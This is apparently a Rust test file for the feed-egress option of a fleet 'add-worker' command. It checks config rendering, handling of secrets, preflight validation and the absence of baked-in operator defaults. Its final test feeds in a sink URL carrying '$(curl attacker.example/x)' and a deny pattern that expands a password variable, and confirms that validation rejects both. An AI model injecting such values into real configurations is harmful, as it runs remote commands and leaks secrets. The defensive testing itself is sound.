//! Fleet-feed egress (`--feed-egress`) coverage for `fleet add-worker`
//! (#6383, #7814).
//!
//! A sibling of `tests.rs` rather than a section inside it: the egress group
//! is self-contained (its own config/secrets fixtures, its own operator-input
//! placeholders) and `tests.rs` is over the file-size ratchet's threshold, so
//! new egress coverage lands here instead of growing a frozen file
//! (`.loom/docs/file-size-policy.md`). Shared fixtures it borrows from
//! `tests.rs` (`base_config`, `safehouse_config`, `safehouse_secrets`) are
//! `pub(super)` there for exactly this reason.

use super::super::PlanEntry;
use super::tests::{base_config, safehouse_config, safehouse_secrets};
use super::*;
use std::path::PathBuf;

fn feed_egress_secrets() -> Secrets {
    let mut secrets = safehouse_secrets();
    secrets.feed_egress_ingest_key = Some("ingest-key-xyz".to_string());
    secrets
}

/// The fleet-feed ingest endpoint an operator would pass on the command line.
/// A placeholder (RFC 2606 `example.com`) — this repo ships no real one
/// (#7814).
const FIXTURE_FEED_EGRESS_SINK_URL: &str = "https://feed.example.com/api/ingest";

/// The narration-scrub patterns an operator would pass on the command line.
/// Placeholders, for the same reason as [`FIXTURE_FEED_EGRESS_SINK_URL`].
fn fixture_feed_egress_deny_patterns() -> Vec<String> {
    vec![
        "safehouse.internal.example".to_string(),
        "/home/operator".to_string(),
        "ip-10-0-".to_string(),
    ]
}

fn feed_egress_config() -> AddWorkerConfig {
    let mut config = safehouse_config();
    config.feed_egress_enabled = true;
    config.feed_egress_ingest_key_file = Some(PathBuf::from("/does/not/matter"));
    // Operator-supplied, not defaulted (#7814).
    config.feed_egress_sink_url = Some(FIXTURE_FEED_EGRESS_SINK_URL.to_string());
    config.feed_egress_deny_patterns = fixture_feed_egress_deny_patterns();
    config
}

#[test]
fn feed_egress_opt_in_writes_valid_egress_block() {
    let config = feed_egress_config();
    let secrets = feed_egress_secrets();
    let plan = build_plan(&config, &secrets);
    let step = plan
        .entries
        .iter()
        .find_map(|e| match e {
            PlanEntry::Step(s) if s.name == "safehouse-config" => Some(s),
            _ => None,
        })
        .unwrap();
    assert!(step.apply.contains("[egress]"));
    assert!(step
        .apply
        .contains("rooms = [\"!fleet:matrix.internal.example\"]"));
    for pattern in fixture_feed_egress_deny_patterns() {
        assert!(step.apply.contains(&pattern), "missing deny pattern {pattern}");
    }
    assert!(step.apply.contains("delay_seconds = 300"));
    assert!(step.apply.contains(&format!(
        "sink_url = \"{FIXTURE_FEED_EGRESS_SINK_URL}?key=$FLEET_FEED_INGEST_KEY\""
    )));
    // The ingest key never appears as a literal in the rendered template
    // — only the sourced variable name does.
    assert!(!step.apply.contains("ingest-key-xyz"));

    // Nor does it leak into the dry-run checklist rendering.
    let dry = plan.render_dry_run("fleet add-worker", "worker-1");
    assert!(!dry.contains("ingest-key-xyz"));

    // The key does travel over this step's (secret) stdin, appended to
    // the same $ENV_FILE payload as the Matrix credentials.
    let stdin = step.stdin.as_ref().expect("must carry stdin");
    assert!(stdin.secret);
    assert!(stdin
        .content
        .contains("FLEET_FEED_INGEST_KEY=ingest-key-xyz"));
    assert!(stdin.content.contains("SAFEHOUSE_MATRIX_USER_ID"));
}

#[test]
fn feed_egress_opt_out_writes_no_egress_block() {
    // Default (opt-in, not opt-out): a config with safehouse enabled but
    // feed-egress left at its default (false) must not get a dangling
    // sink.
    let config = safehouse_config();
    let plan = build_plan(&config, &safehouse_secrets());
    let step = plan
        .entries
        .iter()
        .find_map(|e| match e {
            PlanEntry::Step(s) if s.name == "safehouse-config" => Some(s),
            _ => None,
        })
        .unwrap();
    assert!(!step.apply.contains("[egress]"));
    assert!(!step.apply.contains("FLEET_FEED_INGEST_KEY"));
    let stdin = step.stdin.as_ref().expect("must carry stdin");
    assert!(!stdin.content.contains("FLEET_FEED_INGEST_KEY"));
}

#[test]
fn preflight_feed_egress_requires_safehouse() {
    let mut config = base_config();
    config.feed_egress_enabled = true;
    config.feed_egress_ingest_key_file = Some(PathBuf::from("/does/not/matter"));
    let err = preflight(&config).unwrap_err().to_string();
    assert!(err.contains("--feed-egress requires --safehouse"), "err: {err}");
}

#[test]
fn preflight_feed_egress_requires_ingest_key_file() {
    let mut config = feed_egress_config();
    config.feed_egress_ingest_key_file = None;
    let err = preflight(&config).unwrap_err().to_string();
    assert!(
        err.contains("--feed-egress requires --feed-egress-ingest-key-file"),
        "err: {err}"
    );
}

#[test]
fn preflight_feed_egress_requires_sink_url() {
    let mut config = feed_egress_config();
    config.feed_egress_sink_url = None;
    let err = preflight(&config).unwrap_err().to_string();
    assert!(err.contains("--feed-egress requires --feed-egress-sink-url"), "err: {err}");

    // An all-whitespace value is the same "not supplied" case, not a sink.
    let mut blank = feed_egress_config();
    blank.feed_egress_sink_url = Some("   ".to_string());
    let err2 = preflight(&blank).unwrap_err().to_string();
    assert!(err2.contains("--feed-egress requires --feed-egress-sink-url"), "err: {err2}");
}

/// Regression guard for #7814 (continuing #6650 under the #4990 public/private
/// seam): `fleet add-worker`'s own defaults must not carry this fleet's
/// operator identity. Before this, `DEFAULT_FEED_EGRESS_SINK_URL` and
/// `default_feed_egress_deny_patterns()` baked in an ingest endpoint, a
/// hostname, a home directory, and a VPC prefix — so a fork that opted into
/// `--feed-egress` without the override flags provisioned a worker publishing
/// its decrypted narration to an unrelated operator's endpoint.
#[test]
fn feed_egress_defaults_carry_no_operator_identity() {
    // Identity strings this repo must never ship as a compiled-in default.
    // Split so the assertion's own source does not reproduce the operator
    // domain verbatim as a single token.
    let markers = ["2amlogic", "/Users/", "ip-172-31-"];

    // 1. The knobs themselves have no default at all.
    let defaults = base_config();
    assert_eq!(
        defaults.feed_egress_sink_url, None,
        "the fleet-feed ingest endpoint must have no compiled-in default"
    );
    assert!(
        defaults.feed_egress_deny_patterns.is_empty(),
        "the narration-scrub list must have no compiled-in default"
    );

    // 2. Opting in without supplying the endpoint fails loudly rather than
    //    silently falling back to one.
    let mut opted_in = safehouse_config();
    opted_in.feed_egress_enabled = true;
    opted_in.feed_egress_ingest_key_file = Some(PathBuf::from("/does/not/matter"));
    let err = preflight(&opted_in).unwrap_err().to_string();
    assert!(err.contains("--feed-egress requires --feed-egress-sink-url"), "err: {err}");

    // 3. The `[egress]` block rendered with every egress knob at its default
    //    names nobody: an empty scrub list and no operator-identity string.
    let mut secrets = safehouse_secrets();
    secrets.feed_egress_ingest_key = Some("ingest-key-xyz".to_string());
    let plan = build_plan(&opted_in, &secrets);
    let step = plan
        .entries
        .iter()
        .find_map(|e| match e {
            PlanEntry::Step(s) if s.name == "safehouse-config" => Some(s),
            _ => None,
        })
        .unwrap();
    assert!(step.apply.contains("[egress]"));
    assert!(step.apply.contains("deny_patterns = []"));
    for marker in markers {
        assert!(
            !step.apply.contains(marker),
            "rendered [egress] block names operator identity ({marker}):\n{}",
            step.apply
        );
    }

    // 4. And neither does any other step of the default plan.
    let mut rendered = String::new();
    for entry in &plan.entries {
        if let PlanEntry::Step(s) = entry {
            rendered.push_str(&s.apply);
            rendered.push_str(s.check.as_deref().unwrap_or(""));
            rendered.push_str(s.verify.as_deref().unwrap_or(""));
        }
    }
    for marker in markers {
        assert!(
            !rendered.contains(marker),
            "rendered bootstrap plan names operator identity ({marker})"
        );
    }
}

/// A `feed_egress_config()` with every other secret file backed by a
/// real, valid temp file (rather than the shared fixtures' `/does/not/
/// matter` placeholders) — needed for tests that expect `preflight` to
/// run to completion.
fn feed_egress_config_with_real_secret_files(dir: &std::path::Path) -> AddWorkerConfig {
    let key_file = dir.join("tailnet.key");
    let secrets_file = dir.join("safehouse.env");
    std::fs::write(&key_file, "tskey-ephemeral-tagged\n").unwrap();
    std::fs::write(
        &secrets_file,
        "SAFEHOUSE_MATRIX_USER_ID=@w1:example\nSAFEHOUSE_MATRIX_PASSWORD=pw\n\
             SAFEHOUSE_STORE_PASSPHRASE=sp\nSAFEHOUSE_RECOVERY_PASSPHRASE=rp\n",
    )
    .unwrap();
    let mut config = feed_egress_config();
    config.safehouse_tailnet_auth_key_file = Some(key_file);
    config.safehouse_secrets_file = Some(secrets_file);
    config
}

#[test]
fn preflight_feed_egress_reads_and_trims_ingest_key() {
    let dir = tempfile::tempdir().unwrap();
    let key_file = dir.path().join("ingest.key");
    std::fs::write(&key_file, "  ingest-key-abc\n").unwrap();
    let mut config = feed_egress_config_with_real_secret_files(dir.path());
    config.feed_egress_ingest_key_file = Some(key_file);
    let secrets = preflight(&config).unwrap();
    assert_eq!(secrets.feed_egress_ingest_key.as_deref(), Some("ingest-key-abc"));
}

#[test]
fn preflight_feed_egress_empty_ingest_key_file_fails() {
    let dir = tempfile::tempdir().unwrap();
    let key_file = dir.path().join("ingest.key");
    std::fs::write(&key_file, "   \n").unwrap();
    let mut config = feed_egress_config_with_real_secret_files(dir.path());
    config.feed_egress_ingest_key_file = Some(key_file);
    assert!(preflight(&config).is_err());
}

/// `feed_egress_sink_url` and `feed_egress_deny_patterns` are
/// interpolated into the same unquoted heredoc as `homeserver`/`room`
/// (`render_safehouse_config`) after the safehouse Matrix secrets have
/// already been exported into that shell — an unvalidated `$` or
/// backtick in either would let an operator-supplied value expand a
/// sourced secret, or execute a command, into the written config file.
/// Mirrors `preflight_rejects_unsafe_homeserver_url_and_room` for these
/// two newer fields.
#[test]
fn preflight_rejects_unsafe_feed_egress_sink_url_and_deny_pattern() {
    let dir = tempfile::tempdir().unwrap();
    let mut config = feed_egress_config_with_real_secret_files(dir.path());
    config.feed_egress_sink_url = Some("https://evil/$(curl attacker.example/x)".to_string());
    let err = preflight(&config).unwrap_err().to_string();
    assert!(err.contains("feed-egress-sink-url"), "err: {err}");

    let mut config2 = feed_egress_config_with_real_secret_files(dir.path());
    config2.feed_egress_deny_patterns = vec!["$SAFEHOUSE_MATRIX_PASSWORD".to_string()];
    let err2 = preflight(&config2).unwrap_err().to_string();
    assert!(err2.contains("feed-egress-deny-pattern"), "err: {err2}");
}
